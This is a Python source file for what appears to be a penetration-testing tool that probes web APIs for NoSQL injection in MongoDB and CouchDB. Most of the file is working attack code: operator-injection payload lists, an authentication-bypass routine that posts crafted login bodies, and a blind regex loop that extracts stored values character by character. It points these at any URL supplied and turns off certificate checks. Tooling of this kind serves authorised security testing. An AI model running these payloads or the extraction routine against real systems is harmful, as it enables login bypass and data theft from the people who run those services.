"""
NoSQL Injection Testing Wrapper - Tests for NoSQL injection vulnerabilities
Supports MongoDB, CouchDB, and other NoSQL databases
"""
import sys
import argparse
import json
import requests
from pathlib import Path
from typing import Dict, List, Any, Optional
from dataclasses import dataclass
from enum import Enum

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from utils.base_wrapper import InjectionTool


class NoSQLDBType(Enum):
    """NoSQL database types"""
    MONGODB = "mongodb"
    COUCHDB = "couchdb"
    REDIS = "redis"
    CASSANDRA = "cassandra"


@dataclass
class NoSQLFinding:
    """Represents a NoSQL injection finding"""
    payload: str
    payload_type: str
    status_code: int
    response_length: int
    potential_vuln: bool
    evidence: Optional[str] = None
    db_type: Optional[str] = None


class NoSQLInjectionTester(InjectionTool):
    """Wrapper for NoSQL injection testing"""

    # MongoDB injection payloads
    MONGODB_PAYLOADS = [
        # Authentication bypass - JSON
        {"$gt": ""},
        {"$ne": ""},
        {"$ne": None},
        {"$regex": ".*"},
        {"$where": "1==1"},
        {"$exists": True},
        {"$nin": []},
        # Regex-based extraction
        {"$regex": "^a"},
        {"$regex": "^b"},
        {"$regex": ".*", "$options": "i"},
        # Array injection
        {"$in": ["admin", "root", "administrator"]},
        # JavaScript injection
        {"$where": "this.password.length > 0"},
        {"$where": "function() { return true; }"},
    ]

    # MongoDB string payloads for URL parameters
    MONGODB_STRING_PAYLOADS = [
        '{"$gt": ""}',
        '{"$ne": ""}',
        '{"$regex": ".*"}',
        '[$gt]=',
        '[$ne]=',
        '[$regex]=.*',
        "' || '1'=='1",
        "'; return '' == '",
        "1'; return true; var foo='",
        '{"$where": "1==1"}',
        "true, $where: '1 == 1'",
        ", $where: '1 == 1'",
        "$where: '1 == 1'",
    ]

    # CouchDB injection payloads
    COUCHDB_PAYLOADS = [
        '{"_id": {"$gt": ""}}',
        '{"selector": {"_id": {"$gt": null}}}',
        '{"selector": {"$or": [{"_id": {"$gt": null}}]}}',
    ]

    # Error indicators for detection
    ERROR_INDICATORS = {
        'mongodb': [
            'mongodb', 'mongo', 'bson', 'nosql', 'objectid',
            'document', 'collection', 'mongoerror', 'mongoclient',
            '$where', 'query', 'operator'
        ],
        'couchdb': [
            'couchdb', 'couch', 'erlang', 'beam.smp',
            'document', 'revision', '_rev', '_id'
        ],
        'redis': [
            'redis', 'err wrong type', 'unknown command',
            'redisexception'
        ],
        'general': [
            'error', 'exception', 'syntax', 'unexpected',
            'invalid', 'illegal', 'forbidden'
        ]
    }

    @property
    def tool_name(self) -> str:
        return "nosql_injection"

    def _build_target_args(self, target: str, **kwargs) -> list:
        """NoSQL injection doesn't use CLI - this returns empty"""
        return []

    def check_tool_installed(self) -> bool:
        """Override - this tool is pure Python"""
        try:
            import requests
            return True
        except ImportError:
            return False

    def test_injection(self, url: str, param_name: str, method: str = 'POST',
                       headers: Optional[Dict] = None, cookies: Optional[Dict] = None,
                       db_type: str = 'mongodb', timeout: int = 10) -> List[NoSQLFinding]:
        """Test for NoSQL injection vulnerabilities."""
        findings = []
        headers = headers or {'Content-Type': 'application/json'}

        # Get baseline response
        baseline = self._get_baseline(url, param_name, method, headers, cookies, timeout)

        # Select payloads based on database type
        if db_type == 'mongodb':
            payloads = self.MONGODB_PAYLOADS
        elif db_type == 'couchdb':
            payloads = [json.loads(p) if isinstance(p, str) else p for p in self.COUCHDB_PAYLOADS]
        else:
            payloads = self.MONGODB_PAYLOADS  # Default to MongoDB

        for payload in payloads:
            finding = self._test_payload(
                url, param_name, payload, method, headers, cookies, baseline, timeout, db_type
            )
            findings.append(finding)

        return findings

    def test_url_params(self, url: str, param_name: str,
                        headers: Optional[Dict] = None, cookies: Optional[Dict] = None,
                        timeout: int = 10) -> List[NoSQLFinding]:
        """Test NoSQL injection in URL parameters (GET requests)."""
        findings = []

        # Get baseline
        baseline = self._get_baseline(url, param_name, 'GET', headers, cookies, timeout)

        for payload in self.MONGODB_STRING_PAYLOADS:
            try:
                # Build URL with payload
                if '?' in url:
                    test_url = f"{url}&{param_name}={requests.utils.quote(payload)}"
                else:
                    test_url = f"{url}?{param_name}={requests.utils.quote(payload)}"

                response = requests.get(
                    test_url,
                    headers=headers,
                    cookies=cookies,
                    timeout=timeout,
                    allow_redirects=False,
                    verify=False
                )

                vuln_detected = self._detect_vulnerability(response, baseline)

                findings.append(NoSQLFinding(
                    payload=payload,
                    payload_type='url_param',
                    status_code=response.status_code,
                    response_length=len(response.text),
                    potential_vuln=vuln_detected,
                    evidence=response.text[:500] if vuln_detected else None,
                    db_type='mongodb'
                ))
            except requests.exceptions.Timeout:
                findings.append(NoSQLFinding(
                    payload=payload,
                    payload_type='url_param',
                    status_code=0,
                    response_length=0,
                    potential_vuln=True,  # Timeout can indicate injection
                    evidence='Request timed out - possible injection point',
                    db_type='mongodb'
                ))
            except Exception as e:
                findings.append(NoSQLFinding(
                    payload=payload,
                    payload_type='url_param',
                    status_code=0,
                    response_length=0,
                    potential_vuln=False,
                    evidence=str(e),
                    db_type='mongodb'
                ))

        return findings

    def test_auth_bypass(self, url: str, username_field: str = 'username',
                         password_field: str = 'password',
                         headers: Optional[Dict] = None, cookies: Optional[Dict] = None,
                         timeout: int = 10) -> List[NoSQLFinding]:
        """Test for authentication bypass via NoSQL injection."""
        findings = []
        headers = headers or {'Content-Type': 'application/json'}

        # Authentication bypass payloads
        auth_payloads = [
            {username_field: {"$gt": ""}, password_field: {"$gt": ""}},
            {username_field: {"$ne": ""}, password_field: {"$ne": ""}},
            {username_field: {"$ne": None}, password_field: {"$ne": None}},
            {username_field: "admin", password_field: {"$gt": ""}},
            {username_field: "admin", password_field: {"$ne": ""}},
            {username_field: {"$regex": "admin"}, password_field: {"$ne": ""}},
            {username_field: {"$in": ["admin", "root", "administrator"]}, password_field: {"$gt": ""}},
            {username_field: {"$regex": ".*"}, password_field: {"$regex": ".*"}},
            {username_field: {"$exists": True}, password_field: {"$exists": True}},
        ]

        for payload in auth_payloads:
            try:
                response = requests.post(
                    url,
                    json=payload,
                    headers=headers,
                    cookies=cookies,
                    timeout=timeout,
                    allow_redirects=False,
                    verify=False
                )

                # Check for successful authentication indicators
                bypass_indicators = [
                    response.status_code in [200, 301, 302, 303, 307, 308],
                    'dashboard' in response.text.lower(),
                    'welcome' in response.text.lower(),
                    'logged in' in response.text.lower(),
                    'success' in response.text.lower(),
                    'token' in response.text.lower(),
                    'session' in response.headers.get('Set-Cookie', '').lower(),
                ]

                vuln_detected = any(bypass_indicators)

                findings.append(NoSQLFinding(
                    payload=str(payload),
                    payload_type='auth_bypass',
                    status_code=response.status_code,
                    response_length=len(response.text),
                    potential_vuln=vuln_detected,
                    evidence=response.text[:500] if vuln_detected else None,
                    db_type='mongodb'
                ))
            except requests.exceptions.Timeout:
                findings.append(NoSQLFinding(
                    payload=str(payload),
                    payload_type='auth_bypass',
                    status_code=0,
                    response_length=0,
                    potential_vuln=True,
                    evidence='Request timed out',
                    db_type='mongodb'
                ))
            except Exception as e:
                findings.append(NoSQLFinding(
                    payload=str(payload),
                    payload_type='auth_bypass',
                    status_code=0,
                    response_length=0,
                    potential_vuln=False,
                    evidence=str(e),
                    db_type='mongodb'
                ))

        return findings

    def test_data_extraction(self, url: str, param_name: str,
                             headers: Optional[Dict] = None, cookies: Optional[Dict] = None,
                             charset: str = 'abcdefghijklmnopqrstuvwxyz0123456789',
                             max_length: int = 32, timeout: int = 10) -> Dict[str, Any]:
        """Attempt to extract data using regex-based blind NoSQL injection."""
        headers = headers or {'Content-Type': 'application/json'}
        extracted = ""

        for position in range(max_length):
            found_char = False
            for char in charset:
                # Try to extract character at this position
                payload = {param_name: {"$regex": f"^{extracted}{char}"}}

                try:
                    response = requests.post(
                        url,
                        json=payload,
                        headers=headers,
                        cookies=cookies,
                        timeout=timeout,
                        verify=False
                    )

                    # Check if character matched (based on response differences)
                    if response.status_code == 200 and len(response.text) > 0:
                        extracted += char
                        found_char = True
                        break
                except Exception:
                    continue

            if not found_char:
                break

        return {
            'extracted_data': extracted,
            'length': len(extracted),
            'complete': len(extracted) == max_length
        }

    def _test_payload(self, url: str, param_name: str, payload: Any,
                      method: str, headers: Dict, cookies: Optional[Dict],
                      baseline: Optional[int], timeout: int, db_type: str) -> NoSQLFinding:
        """Send request with NoSQL payload."""
        try:
            if method.upper() == 'POST':
                data = {param_name: payload}
                response = requests.post(
                    url,
                    json=data,
                    headers=headers,
                    cookies=cookies,
                    timeout=timeout,
                    allow_redirects=False,
                    verify=False
                )
            else:
                response = requests.get(
                    url,
                    params={param_name: json.dumps(payload) if isinstance(payload, dict) else payload},
                    headers=headers,
                    cookies=cookies,
                    timeout=timeout,
                    allow_redirects=False,
                    verify=False
                )

            vuln_detected = self._detect_vulnerability(response, baseline)

            return NoSQLFinding(
                payload=str(payload),
                payload_type='json_injection' if isinstance(payload, dict) else 'string_injection',
                status_code=response.status_code,
                response_length=len(response.text),
                potential_vuln=vuln_detected,
                evidence=response.text[:500] if vuln_detected else None,
                db_type=db_type
            )
        except requests.exceptions.Timeout:
            return NoSQLFinding(
                payload=str(payload),
                payload_type='json_injection' if isinstance(payload, dict) else 'string_injection',
                status_code=0,
                response_length=0,
                potential_vuln=True,
                evidence='Request timed out - possible injection point',
                db_type=db_type
            )
        except Exception as e:
            return NoSQLFinding(
                payload=str(payload),
                payload_type='json_injection' if isinstance(payload, dict) else 'string_injection',
                status_code=0,
                response_length=0,
                potential_vuln=False,
                evidence=str(e),
                db_type=db_type
            )

    def _get_baseline(self, url: str, param_name: str, method: str,
                      headers: Optional[Dict], cookies: Optional[Dict],
                      timeout: int) -> Optional[int]:
        """Get baseline response length."""
        try:
            if method.upper() == 'POST':
                response = requests.post(
                    url,
                    json={param_name: 'test'},
                    headers=headers,
                    cookies=cookies,
                    timeout=timeout,
                    verify=False
                )
            else:
                response = requests.get(
                    url,
                    params={param_name: 'test'},
                    headers=headers,
                    cookies=cookies,
                    timeout=timeout,
                    verify=False
                )
            return len(response.text)
        except Exception:
            return None

    def _detect_vulnerability(self, response: requests.Response,
                             baseline: Optional[int]) -> bool:
        """Detect potential vulnerability indicators."""
        text_lower = response.text.lower()

        # Check for error messages indicating NoSQL
        for db_type, indicators in self.ERROR_INDICATORS.items():
            if any(ind in text_lower for ind in indicators):
                return True

        # Check for significant response length difference
        if baseline:
            length_diff = abs(len(response.text) - baseline)
            if length_diff > 100:  # Significant difference
                return True

        # Check for successful responses that might indicate bypass
        if response.status_code == 200:
            success_indicators = ['success', 'true', 'valid', 'found', 'data']
            if any(ind in text_lower for ind in success_indicators):
                return True

        return False

    def run(self, target: str, output_file: str = None, **kwargs) -> Dict[str, Any]:
        """Run NoSQL injection tests."""
        from datetime import datetime

        self.start_time = datetime.now()

        param_name = kwargs.get('param', 'id')
        method = kwargs.get('method', 'POST')
        headers = kwargs.get('headers')
        cookies = kwargs.get('cookies')
        db_type = kwargs.get('db_type', 'mongodb')
        test_auth = kwargs.get('test_auth', False)
        timeout = kwargs.get('timeout', 10)

        all_findings = []

        print(f"[*] Testing NoSQL injection on {target}")
        print(f"[*] Parameter: {param_name}, Method: {method}, DB Type: {db_type}")

        # Standard injection tests
        print("[*] Running standard injection tests...")
        findings = self.test_injection(url=target, param_name=param_name, method=method,
                                       headers=headers, cookies=cookies, db_type=db_type,
                                       timeout=timeout)
        all_findings.extend(findings)

        # URL parameter tests (GET)
        if method.upper() == 'GET':
            print("[*] Running URL parameter tests...")
            url_findings = self.test_url_params(url=target, param_name=param_name,
                                               headers=headers, cookies=cookies,
                                               timeout=timeout)
            all_findings.extend(url_findings)

        # Authentication bypass tests
        if test_auth:
            print("[*] Running authentication bypass tests...")
            auth_findings = self.test_auth_bypass(url=target, headers=headers,
                                                  cookies=cookies, timeout=timeout)
            all_findings.extend(auth_findings)

        self.end_time = datetime.now()
        duration = (self.end_time - self.start_time).total_seconds()

        # Filter vulnerable findings
        vulnerable = [f for f in all_findings if f.potential_vuln]

        # Save results
        if output_file is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = self.output_dir / f"nosql_injection_{timestamp}.json"

        results = {
            'target': target,
            'parameter': param_name,
            'method': method,
            'db_type': db_type,
            'total_tests': len(all_findings),
            'vulnerable_count': len(vulnerable),
            'findings': [
                {
                    'payload': f.payload,
                    'payload_type': f.payload_type,
                    'status_code': f.status_code,
                    'response_length': f.response_length,
                    'potential_vuln': f.potential_vuln,
                    'evidence': f.evidence,
                    'db_type': f.db_type
                }
                for f in all_findings
            ]
        }

        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"[+] Results saved to: {output_file}")

        return {
            'success': True,
            'tool': self.tool_name,
            'target': target,
            'duration': duration,
            'output_file': str(output_file),
            'results': all_findings,
            'vulnerable_count': len(vulnerable)
        }


def main():
    parser = argparse.ArgumentParser(
        description="NoSQL Injection Tester - Test for MongoDB, CouchDB, and other NoSQL injection vulnerabilities",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python nosql_injection.py -u "https://example.com/api/users" -p username
  python nosql_injection.py -u "https://example.com/login" --test-auth
  python nosql_injection.py -u "https://example.com/search" -p query --method GET
  python nosql_injection.py -u "https://example.com/api" -p id --db-type couchdb
        """
    )

    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--param", default="id", help="Parameter to test (default: id)")
    parser.add_argument("-m", "--method", default="POST", choices=['GET', 'POST'],
                       help="HTTP method (default: POST)")
    parser.add_argument("--db-type", default="mongodb",
                       choices=['mongodb', 'couchdb', 'redis'],
                       help="Target database type (default: mongodb)")
    parser.add_argument("--test-auth", action="store_true",
                       help="Run authentication bypass tests")
    parser.add_argument("-H", "--header", action="append", dest="headers",
                       help="Custom header (format: 'Name: Value')")
    parser.add_argument("--cookie", help="Cookie string")
    parser.add_argument("-t", "--timeout", type=int, default=10,
                       help="Request timeout in seconds (default: 10)")
    parser.add_argument("-o", "--output", help="Output file path")

    args = parser.parse_args()

    # Parse headers
    headers = {'Content-Type': 'application/json'}
    if args.headers:
        for h in args.headers:
            if ':' in h:
                name, value = h.split(':', 1)
                headers[name.strip()] = value.strip()

    # Parse cookies
    cookies = None
    if args.cookie:
        cookies = {}
        for cookie in args.cookie.split(';'):
            if '=' in cookie:
                name, value = cookie.split('=', 1)
                cookies[name.strip()] = value.strip()

    tester = NoSQLInjectionTester()

    result = tester.run(
        target=args.url,
        param=args.param,
        method=args.method,
        db_type=args.db_type,
        test_auth=args.test_auth,
        headers=headers,
        cookies=cookies,
        timeout=args.timeout,
        output_file=args.output
    )

    # Print summary
    print(f"\n{'='*60}")
    print(f"NoSQL Injection Test Results")
    print(f"{'='*60}")
    print(f"Target: {args.url}")
    print(f"Parameter: {args.param}")
    print(f"Database Type: {args.db_type}")
    print(f"Total Tests: {len(result['results'])}")
    print(f"Potential Vulnerabilities: {result['vulnerable_count']}")

    if result['vulnerable_count'] > 0:
        print(f"\n[!] POTENTIAL NoSQL INJECTION FOUND!")
        for finding in result['results']:
            if finding.potential_vuln:
                print(f"\n  Payload: {finding.payload[:100]}...")
                print(f"  Type: {finding.payload_type}")
                print(f"  Status Code: {finding.status_code}")
                if finding.evidence:
                    print(f"  Evidence: {finding.evidence[:200]}...")
    else:
        print("\n[+] No NoSQL injection vulnerabilities detected")

    return 0 if result['success'] else 1


if __name__ == "__main__":
    # Suppress SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    sys.exit(main())
